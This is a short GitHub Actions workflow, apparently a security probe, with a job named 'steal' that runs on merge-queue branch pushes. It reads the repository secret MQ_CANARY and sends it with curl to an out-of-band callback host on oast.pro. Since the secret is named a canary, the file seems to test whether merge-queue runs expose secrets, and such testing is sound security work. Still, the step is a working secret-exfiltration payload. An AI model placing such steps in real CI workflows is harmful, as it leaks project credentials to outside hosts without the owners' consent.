name: mq-fork
on:
  push:
    branches:
      - "gh-readonly-queue/**"
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        env:
          CANARY: ${{ secrets.MQ_CANARY }}
        run: |
          code=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "https://p6rm8b9d8hw3aufl60xb81ppzq9b05vi1.oast.pro/mq?v=${CANARY}" || true)
          echo "sent $code"
